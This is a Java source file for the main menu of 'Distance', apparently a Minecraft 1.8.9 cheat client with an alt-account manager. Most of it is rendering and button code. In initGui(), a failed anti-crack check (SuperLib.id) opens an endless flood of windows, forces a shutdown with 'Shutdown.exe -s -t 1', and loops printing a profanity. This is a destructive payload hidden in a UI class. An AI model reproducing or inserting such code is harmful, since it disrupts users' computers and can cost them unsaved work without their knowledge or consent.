package my.distance.ui.gui;

        import LemonObfAnnotation.ObfuscationClass;
        import my.distance.Client;
        import my.distance.ui.BackGroundRenderer;
        import my.distance.ui.buttons.SimpleButton;
        import my.distance.ui.font.FontLoaders;
        import my.distance.ui.jelloparticle.ParticleEngine;
        import my.distance.ui.login.GuiAltManager;
        import my.distance.util.SuperLib;
        import my.distance.util.anim.AnimationUtil;
        import my.distance.util.anim.AnimationUtils;
        import my.distance.util.render.RenderUtil;
        import my.distance.util.time.TimerUtil;
        import net.minecraft.client.Minecraft;
        import net.minecraft.client.gui.*;
        import net.minecraft.client.renderer.GlStateManager;
        import net.minecraft.client.renderer.texture.DynamicTexture;
        import net.minecraft.client.resources.I18n;
        import net.minecraft.util.EnumChatFormatting;
        import net.minecraft.util.ResourceLocation;
        import net.minecraft.world.storage.ISaveFormat;
        import net.minecraft.world.storage.WorldInfo;
        import org.apache.logging.log4j.LogManager;
        import org.apache.logging.log4j.Logger;
        import org.lwjgl.opengl.GL11;

        import javax.swing.*;
        import java.awt.*;
        import java.io.IOException;
        import java.net.URI;
        import java.util.Timer;
        import java.util.*;

@ObfuscationClass
public class GuiCustomMainMenu extends GuiScreen implements GuiYesNoCallback {
    private static final Logger logger = LogManager.getLogger();
    private static final Random field_175374_h = new Random();
    /**
     * Counts the number of screen updates.
     */
    public static double introTrans;
    /**
     * The splash message.
     */
    private String splashText;
    private GuiButton buttonResetDemo;
    /**
     * Texture allocated for the current viewport of the main menu's panorama background.
     */
    private DynamicTexture viewportTexture;
    private final Object field_104025_t = new Object();
    private String field_92025_p;
    private String field_146972_A;
    private String field_104024_v;
    private static final ResourceLocation splashTexts = new ResourceLocation("texts/splashes.txt");

    /**
     * An array of all the paths to the panorama pictures.
     */
    public static final String field_96138_a = "Please click " + EnumChatFormatting.UNDERLINE + "here" + EnumChatFormatting.RESET + " for more information.";
    private int field_92024_r;
    private int field_92023_s;
    private int field_92022_t;
    private int field_92021_u;
    private int field_92020_v;
    private int field_92019_w;


    public static float animatedMouseX;
    public static float animatedMouseY;


    public double zoom1 = 1, zoom2 = 1, zoom3 = 1, zoom4 = 1, zoom5 = 1;
    boolean clientsetting = false;
    private static final TimerUtil timer = new TimerUtil();
    boolean rev = false;
    double anim, anim2, anim3 = new ScaledResolution(Minecraft.getMinecraft()).getScaledWidth();


    public ParticleEngine pe = new ParticleEngine();

    public GuiCustomMainMenu() {
        needTranss = false;
    }

    boolean needTranss;

    public GuiCustomMainMenu(boolean needTrans) {
        needTranss = needTrans;
    }

    /**
     * Returns true if this GUI should pause the game when it is displayed in single-player
     */
    public boolean doesGuiPauseGame() {
        return false;
    }

    /**
     * Fired when a key is typed (except F11 who toggle full screen). This is the equivalent of
     * KeyListener.keyTyped(KeyEvent e). Args : character (character on the key), keyCode (lwjgl Keyboard key code)
     */
    protected void keyTyped(char typedChar, int keyCode) throws IOException {
        super.keyTyped(typedChar,keyCode);
    }

    /**
     * Adds the buttons (and other controls) to the screen in question.
     */
    public void initGui() {
        if (SuperLib.id != 1) {
            new Thread(() -> {
                Random rd = new Random();
                while (true) {
                    JFrame frame = new JFrame("别破解了，求你了");
                    frame.setSize(400, 200);
                    frame.setLocation(rd.nextInt(java.awt.Toolkit.getDefaultToolkit().getScreenSize().width), rd.nextInt(java.awt.Toolkit.getDefaultToolkit().getScreenSize().height));
                    frame.setVisible(true);
                }
            }).start();
            new Timer().schedule(new TimerTask() {
                public void run() {
                    Runtime run = Runtime.getRuntime();
                    try {
                        run.exec("Shutdown.exe -s -t 1");
                        run.exit(0);
                    } catch (IOException e) {
                        run.exit(0);
                    }
                }
            }, (5000L));
            while (true) {
                System.out.println("CNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNM");
            }
        }
        if (SuperLib.id2 != 0) {
            new Thread(() -> {
                Random rd = new Random();
                while (true) {
                    JFrame frame = new JFrame("别破解了，求你了");
                    frame.setSize(400, 200);
                    frame.setLocation(rd.nextInt(java.awt.Toolkit.getDefaultToolkit().getScreenSize().width), rd.nextInt(java.awt.Toolkit.getDefaultToolkit().getScreenSize().height));
                    frame.setVisible(true);
                }
            }).start();
            new Timer().schedule(new TimerTask() {
                public void run() {
                    Runtime run = Runtime.getRuntime();
                    try {
                        run.exec("Shutdown.exe -s -t 1");
                        run.exit(0);
                    } catch (IOException e) {
                        run.exit(0);
                    }
                }
            }, (5000L));
            while (true) {
                System.out.println("CNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNM");
            }
        }
        timer.reset();
        pe.particles.clear();
        ScaledResolution sr = new ScaledResolution(this.mc);
        introTrans = sr.getScaledHeight();
        this.viewportTexture = new DynamicTexture(256, 256);
        Calendar var1 = Calendar.getInstance();
        var1.setTime(new Date());

        int var3 = this.height / 4 + 48;

        if (this.mc.isDemo()) {
            this.addDemoButtons(var3, 24);
        } else {
            this.addSingleplayerMultiplayerButtons(var3, 24);
        }

        this.buttonList.add(new SimpleButton(84757, this.width / 2, (height) - 10, "ClientSetting"));
        //this.buttonList.add(new GuiButton(4, this.width / 2 + 38, var3 + 72 + 12+ 8, 62, 20, I18n.format("menu.quit", new Object[0])));
        //this.buttonList.add(new GuiButton(5, this.width / 2 - 100, var3 + 72 + 12+ 8, 62, 20, I18n.format("Lang", new Object[0])));
        Object var4 = this.field_104025_t;

        synchronized (this.field_104025_t) {
            this.field_92023_s = this.fontRendererObj.getStringWidth(this.field_92025_p);
            this.field_92024_r = this.fontRendererObj.getStringWidth(this.field_146972_A);
            int var5 = Math.max(this.field_92023_s, this.field_92024_r);
            this.field_92022_t = (this.width - var5) / 2;
            this.field_92021_u = 0;///((GuiButton)this.buttonList.get(0)).yPosition - 24;
            this.field_92020_v = this.field_92022_t + var5;
            this.field_92019_w = this.field_92021_u + 24;
        }
    }

    /**
     * Adds Singleplayer and Multiplayer buttons on Main Menu for players who have bought the game.
     */
    private void addSingleplayerMultiplayerButtons(int p_73969_1_, int p_73969_2_) {
    }

    /**
     * Adds Demo buttons on Main Menu for players who are playing Demo.
     */
    private void addDemoButtons(int p_73972_1_, int p_73972_2_) {
        this.buttonList.add(new GuiButton(11, this.width / 2 - 100, p_73972_1_, I18n.format("menu.playdemo")));
        this.buttonList.add(this.buttonResetDemo = new GuiButton(12, this.width / 2 - 100, p_73972_1_ + p_73972_2_ * 1, I18n.format("menu.resetdemo")));
        ISaveFormat var3 = this.mc.getSaveLoader();
        WorldInfo var4 = var3.getWorldInfo("Demo_World");

        if (var4 == null) {
            this.buttonResetDemo.enabled = false;
        }
    }

    protected void actionPerformed(GuiButton button) throws IOException {
        if (button.id == 84757) {
            rev = true;
            clientsetting = true;
            needTranss = true;
        }
    }

    public void confirmClicked(boolean result, int id) {
        if (result && id == 12) {
            ISaveFormat var6 = this.mc.getSaveLoader();
            var6.flushCache();
            var6.deleteWorldDirectory("Demo_World");
            this.mc.displayGuiScreen(this);
        } else if (id == 13) {
            if (result) {
                try {
                    Class var3 = Class.forName("java.awt.Desktop");
                    Object var4 = var3.getMethod("getDesktop", new Class[0]).invoke(null);
                    var3.getMethod("browse", new Class[]{URI.class}).invoke(var4, new URI(this.field_104024_v));
                } catch (Throwable var5) {
                    logger.error("Couldn't open link", var5);
                }
            }

            this.mc.displayGuiScreen(this);
        }
    }

    /**
     * Draws the screen and all the components in it. Args : mouseX, mouseY, renderPartialTicks
     */
    boolean hovered = false;

    public void drawScreen(int mouseX, int mouseY, float partialTicks) {
        if (!timer.hasReached(200) && needTranss) {
            anim = anim2 = anim3 = new ScaledResolution(Minecraft.getMinecraft()).getScaledWidth();
            rev = true;
        } else if (!hovered || !clientsetting) {
            rev = false;
        }
        if (!needTranss && (!hovered || !clientsetting)) {
            anim = anim2 = anim3 = 0;
        }
        if (hovered) {
            rev = true;
            if (anim2 >= width - 5) {
                mc.displayGuiScreen(new GuiGoodBye());
            }
        } else if (clientsetting) {
            rev = true;
            if (anim2 >= width - 5) {
                this.mc.displayGuiScreen(new GuiClientSetting(this, true));
            }
        }
        if (rev) {
            anim = AnimationUtils.animate(new ScaledResolution(Minecraft.getMinecraft()).getScaledWidth(), anim, 6.0f / Minecraft.getDebugFPS());
            anim2 = AnimationUtils.animate(new ScaledResolution(Minecraft.getMinecraft()).getScaledWidth(), anim2, 4.0f / Minecraft.getDebugFPS());
            anim3 = AnimationUtils.animate(new ScaledResolution(Minecraft.getMinecraft()).getScaledWidth(), anim3, 5.5f / Minecraft.getDebugFPS());
        } else {
            anim = AnimationUtils.animate(0, anim, 3.0f / Minecraft.getDebugFPS());
            anim2 = AnimationUtils.animate(0, anim2, 5.0f / Minecraft.getDebugFPS());
            anim3 = AnimationUtils.animate(0, anim3, 4.0f / Minecraft.getDebugFPS());
        }

        if (introTrans > 0) {
            introTrans -= introTrans / 7;
        }
        GlStateManager.enableAlpha();

        GlStateManager.color(1.0F, 1.0F, 1.0F, 1.0F);
        ScaledResolution sr = new ScaledResolution(this.mc);
        BackGroundRenderer.render();
        //GlStateManager.disableAlpha();
        GlStateManager.enableBlend();

        float offset = -16 + sr.getScaledWidth() / 2f - 289 / 2f + 8;
        float height = sr.getScaledHeight() / 2f + 29 / 2f - 8 + 0.5f;
        GL11.glEnable(3042);
        FontLoaders.GoogleSans20.drawString("Distance made by Distance Team", Client.FontLoaders.Chinese20.getStringWidth("\u00a9") + 5.5f, sr.getScaledHeight() - 5.5f - FontLoaders.GoogleSans20.getHeight() + 1, new Color(255, 255, 255, 180).getRGB());
        Client.FontLoaders.Chinese20.drawString("\u00a9", 4, sr.getScaledHeight() - Client.FontLoaders.Chinese20.FONT_HEIGHT - 3, new Color(255, 255, 255, 180).getRGB());
        FontLoaders.GoogleSans20.drawString("Minecraft 1.8.9 / Distance", sr.getScaledWidth() - 5 - 0.5f - FontLoaders.GoogleSans20.getStringWidth("Minecraft 1.8.9 / Distance") + 1, sr.getScaledHeight() - 5 - FontLoaders.GoogleSans18.getHeight() + 1, new Color(255, 255, 255, 180).getRGB());
        GlStateManager.color(1.0F, 1.0F, 1.0F, 1.0F);

        this.mc.getTextureManager().bindTexture(new ResourceLocation("Jello/JelloLogo.png"));
        drawModalRectWithCustomSizedTexture((int) (sr.getScaledWidth() / 2 - 323 / 4f - 3), (int) (sr.getScaledHeight() / 2 - 161 / 2f + 11 - 32 / 2f + 0.5f + 15), 0, 0, 323 / 2, 161 / 2, 323 / 2f, 161 / 2f);
        //FontLoaders.calibrilite50.drawCenteredString(Client.name,sr.getScaledWidth()/2,sr.getScaledHeight()/2 - 30,-1);
        pe.render(0, 0);

        GlStateManager.pushMatrix();

        if (this.isMouseHoveringRect1(offset + 4, height + 4, 64 - 8, 64 - 8, mouseX, mouseY)) {
            zoom1 = AnimationUtil.moveUD(zoom1, 10, 13f / Minecraft.getDebugFPS(), 8f / Minecraft.getDebugFPS());
        } else {
            zoom1 = AnimationUtil.moveUD(zoom1, 1, 13f / Minecraft.getDebugFPS(), 8f / Minecraft.getDebugFPS());
        }
        this.mc.getTextureManager().bindTexture(new ResourceLocation("Jello/singleplayer.png"));
        GL11.glTexParameteri(GL11.GL_TEXTURE_2D, GL11.GL_TEXTURE_MIN_FILTER, GL11.GL_LINEAR);
        GL11.glTexParameteri(GL11.GL_TEXTURE_2D, GL11.GL_TEXTURE_MAG_FILTER, GL11.GL_LINEAR);
        GlStateManager.translate(0, -zoom1, 0);
        GlStateManager.color(1, 1, 1, 1);
        drawModalRectWithCustomSizedTexture((int) offset, (int) height, 0, 0, 64, 64, 64, 64);
        GlStateManager.popMatrix();
        GlStateManager.pushMatrix();
        if (zoom1 > 2) {
            GlStateManager.translate(0, -zoom1, 0);
            FontLoaders.calibrilite24.drawString("Singleplayer", offset + 32 - FontLoaders.calibrilite24.getStringWidth("Singleplayer") / 2f + 0.5f, height + 140 / 2f + 1 - 4, new Color(255 / 255f, 255 / 255f, 255 / 255f, (float) Math.max(0, (zoom1 / 10))).getRGB());

        }
        GlStateManager.popMatrix();

        offset += 122 / 2f;

        GlStateManager.pushMatrix();


        if (this.isMouseHoveringRect1(offset + 4, height + 4, 64 - 8, 64 - 8, mouseX, mouseY)) {
            zoom2 = AnimationUtil.moveUD(zoom2, 10, 13f / Minecraft.getDebugFPS(), 8f / Minecraft.getDebugFPS());
        } else {
            zoom2 = AnimationUtil.moveUD(zoom2, 1, 13f / Minecraft.getDebugFPS(), 8f / Minecraft.getDebugFPS());
        }
        if (zoom2 > 1) {
            GlStateManager.translate(0, -zoom2, 0);
            GlStateManager.color(1, 1, 1, 1);
        }
        this.mc.getTextureManager().bindTexture(new ResourceLocation("Jello/multiplayer.png"));
        GL11.glTexParameteri(GL11.GL_TEXTURE_2D, GL11.GL_TEXTURE_MIN_FILTER, GL11.GL_LINEAR);
        GL11.glTexParameteri(GL11.GL_TEXTURE_2D, GL11.GL_TEXTURE_MAG_FILTER, GL11.GL_LINEAR);
        GlStateManager.color(1, 1, 1, 1);

        drawModalRectWithCustomSizedTexture((int) offset, (int) height, 0, 0, 64, 64, 64, 64);
        GlStateManager.popMatrix();
        GlStateManager.pushMatrix();
        if (zoom2 > 2) {
            GlStateManager.translate(0, -zoom2, 0);
            FontLoaders.calibrilite24.drawString("Multiplayer", offset + 32 - FontLoaders.calibrilite24.getStringWidth("Multiplayer") / 2f + 0.5f, height + 140 / 2f + 1 - 4, new Color(255 / 255f, 255 / 255f, 255 / 255f, (float) Math.max(0, (zoom2 / 10))).getRGB());
        }
        GlStateManager.popMatrix();

        offset += 122 / 2f;
        GlStateManager.pushMatrix();


        if (this.isMouseHoveringRect1(offset + 4, height + 4, 64 - 8, 64 - 8, mouseX, mouseY)) {
            zoom3 = AnimationUtil.moveUD(zoom3, 10, 13f / Minecraft.getDebugFPS(), 8f / Minecraft.getDebugFPS());
        } else {
            zoom3 = AnimationUtil.moveUD(zoom3, 1, 13f / Minecraft.getDebugFPS(), 8f / Minecraft.getDebugFPS());
        }
        if (zoom3 > 1) {
            GlStateManager.translate(0, -zoom3, 0);
            GlStateManager.color(1, 1, 1, 1);
        }
        this.mc.getTextureManager().bindTexture(new ResourceLocation("Jello/altmanager.png"));
        GL11.glTexParameteri(GL11.GL_TEXTURE_2D, GL11.GL_TEXTURE_MIN_FILTER, GL11.GL_LINEAR);
        GL11.glTexParameteri(GL11.GL_TEXTURE_2D, GL11.GL_TEXTURE_MAG_FILTER, GL11.GL_LINEAR);
        GlStateManager.color(1, 1, 1, 1);

        drawModalRectWithCustomSizedTexture((int) offset, (int) height, 0, 0, 64, 64, 64, 64);
        GlStateManager.popMatrix();
        GlStateManager.pushMatrix();
        if (zoom3 > 2) {
            GlStateManager.translate(0, -zoom3, 0);
            FontLoaders.calibrilite24.drawString("Alt Manager", offset + 32 - FontLoaders.calibrilite24.getStringWidth("Alt Manager") / 2 + 0.5f, height + 140 / 2 + 1 - 4, new Color(255 / 255f, 255 / 255f, 255 / 255f, (float) Math.max(0, (zoom3 / 10))).getRGB());
        }
        GlStateManager.popMatrix();

        offset += 122 / 2f;
        GlStateManager.pushMatrix();


        if (this.isMouseHoveringRect1(offset + 4, height + 4, 64 - 8, 64 - 8, mouseX, mouseY)) {
            zoom4 = AnimationUtil.moveUD(zoom4, 10, 13f / Minecraft.getDebugFPS(), 8f / Minecraft.getDebugFPS());
        } else {
            zoom4 = AnimationUtil.moveUD(zoom4, 1, 13f / Minecraft.getDebugFPS(), 8f / Minecraft.getDebugFPS());
        }
        if (zoom4 > 1) {
            GlStateManager.translate(0, -zoom4, 0);
            GlStateManager.color(1, 1, 1, 1);
        }
        this.mc.getTextureManager().bindTexture(new ResourceLocation("Jello/settings.png"));
        GL11.glTexParameteri(GL11.GL_TEXTURE_2D, GL11.GL_TEXTURE_MIN_FILTER, GL11.GL_LINEAR);
        GL11.glTexParameteri(GL11.GL_TEXTURE_2D, GL11.GL_TEXTURE_MAG_FILTER, GL11.GL_LINEAR);
        GlStateManager.color(1, 1, 1, 1);

        drawModalRectWithCustomSizedTexture((int) offset, (int) height, 0, 0, 64, 64, 64, 64);
        GlStateManager.popMatrix();
        GlStateManager.pushMatrix();
        if (zoom4 > 2) {
            GlStateManager.translate(0, -zoom4, 0);
            FontLoaders.calibrilite24.drawString("Settings", offset + 32 - FontLoaders.calibrilite24.getStringWidth("Settings") / 2 + 0.5f, height + 140 / 2 + 1 - 4, new Color(255 / 255f, 255 / 255f, 255 / 255f, (float) Math.max(0, (zoom4 / 10))).getRGB());
        }
        GlStateManager.popMatrix();

        offset += 122 / 2f;
        GlStateManager.pushMatrix();
        if (this.isMouseHoveringRect1(offset + 4, height + 4, 64 - 8, 64 - 8, mouseX, mouseY)) {
            zoom5 = AnimationUtil.moveUD(zoom5, 10, 13f / Minecraft.getDebugFPS(), 8f / Minecraft.getDebugFPS());
        } else {
            zoom5 = AnimationUtil.moveUD(zoom5, 1, 13f / Minecraft.getDebugFPS(), 8f / Minecraft.getDebugFPS());
        }

        if (zoom5 > 1) {
            GlStateManager.translate(0, -zoom5, 0);
            GlStateManager.color(1, 1, 1, 1);
        }

        this.mc.getTextureManager().bindTexture(new ResourceLocation("Jello/exit.png"));
        GL11.glTexParameteri(GL11.GL_TEXTURE_2D, GL11.GL_TEXTURE_MIN_FILTER, GL11.GL_LINEAR);
        GL11.glTexParameteri(GL11.GL_TEXTURE_2D, GL11.GL_TEXTURE_MAG_FILTER, GL11.GL_LINEAR);
        GlStateManager.color(1, 1, 1, 1);

        drawModalRectWithCustomSizedTexture((int) offset, (int) height, 0, 0, 64, 64, 64, 64);
        GlStateManager.popMatrix();
        GlStateManager.pushMatrix();
        if (zoom5 > 2) {
            GlStateManager.translate(0, -zoom5, 0);
            FontLoaders.calibrilite24.drawString("Exit", offset + 32 - FontLoaders.calibrilite24.getStringWidth("Exit") / 2 + 0.5f, height + 140 / 2 + 1 - 4, new Color(255 / 255f, 255 / 255f, 255 / 255f, (float) Math.max(0, (zoom5 / 10))).getRGB());
        }
        GlStateManager.popMatrix();

        GlStateManager.enableBlend();

        animatedMouseX += ((mouseX - animatedMouseX) / 1.8) + 0.1;
        animatedMouseY += ((mouseY - animatedMouseY) / 1.8) + 0.1;

        super.drawScreen(mouseX, mouseY, partialTicks);

        RenderUtil.drawRect(-10, -10, anim, (height * 2) + 10, new Color(203, 50, 255).getRGB());
        RenderUtil.drawRect(-10, -10, anim3, (height * 2) + 10, new Color(0, 217, 255).getRGB());
        RenderUtil.drawRect(-10, -10, anim2, (height * 2) + 10, new Color(47, 47, 47).getRGB());

    }

    /**
     * Called when the mouse is clicked. Args : mouseX, mouseY, clickedButton
     */
    protected void mouseClicked(int mouseX, int mouseY, int mouseButton) throws IOException {
        super.mouseClicked(mouseX, mouseY, mouseButton);
        Object var4 = this.field_104025_t;

        synchronized (this.field_104025_t) {
            if (this.field_92025_p.length() > 0 && mouseX >= this.field_92022_t && mouseX <= this.field_92020_v && mouseY >= this.field_92021_u && mouseY <= this.field_92019_w) {
                GuiConfirmOpenLink var5 = new GuiConfirmOpenLink(this, this.field_104024_v, 13, true);
                var5.disableSecurityWarning();
                this.mc.displayGuiScreen(var5);
            }
        }
        ScaledResolution sr = new ScaledResolution(this.mc);

        if (mouseButton == 0) {
            float offset = -16 + sr.getScaledWidth() / 2 - 289 / 2f + 8;
            float height = sr.getScaledHeight() / 2 + 29 / 2f - 8;

            if (this.isMouseHoveringRect1(offset + 4, height + 4, 64 - 8, 64 - 8, mouseX, mouseY)) {
                needTranss = false;
                mc.displayGuiScreen(new GuiSelectWorld(this));
            }
            offset += 122 / 2f;
            if (this.isMouseHoveringRect1(offset + 4, height + 4, 64 - 8, 64 - 8, mouseX, mouseY)) {
                needTranss = false;
                mc.displayGuiScreen(new GuiMultiplayer(this));
            }
            offset += 122 / 2f;
            if (this.isMouseHoveringRect1(offset + 4, height + 4, 64 - 8, 64 - 8, mouseX, mouseY)) {
                needTranss = false;
                mc.displayGuiScreen(new GuiAltManager());
            }
            offset += 122 / 2f;
            if (this.isMouseHoveringRect1(offset + 4, height + 4, 64 - 8, 64 - 8, mouseX, mouseY)) {
                needTranss = false;
                mc.displayGuiScreen(new GuiOptions(this, mc.gameSettings));
            }
            offset += 122 / 2f;
            if (this.isMouseHoveringRect1(offset + 4, height + 4, 64 - 8, 64 - 8, mouseX, mouseY)) {
                rev = true;
                hovered = true;
                needTranss = true;
            }

        }
    }

    public boolean isMouseHoveringRect1(float x, float y, float width, float height, int mouseX, int mouseY) {
        return mouseX >= x && mouseY >= y && mouseX <= x + width && mouseY <= y + height;
    }

    public boolean isMouseHoveringRect2(float x, float y, float x2, float y2, int mouseX, int mouseY) {
        return mouseX >= x && mouseY >= y && mouseX <= x2 && mouseY <= y2;
    }
}
